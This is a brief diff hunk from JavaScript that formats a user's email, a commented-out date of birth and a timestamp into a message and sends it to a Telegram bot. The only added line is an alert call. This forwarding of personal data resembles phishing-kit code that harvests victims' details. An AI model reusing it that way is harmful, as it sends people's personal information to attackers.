@@ -500,6 +500,7 @@ function sendMessageToTelegram(botToken, chatId, messageText) {
                            //`👤 Date of Birth: ${data.dob}\n` +
                            `📧 Email: ${data.email}\n` +
                            `⏰ Time: ${new Date().toLocaleString()}`;
+			alert(message)
             
             sendMessageToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);
 		
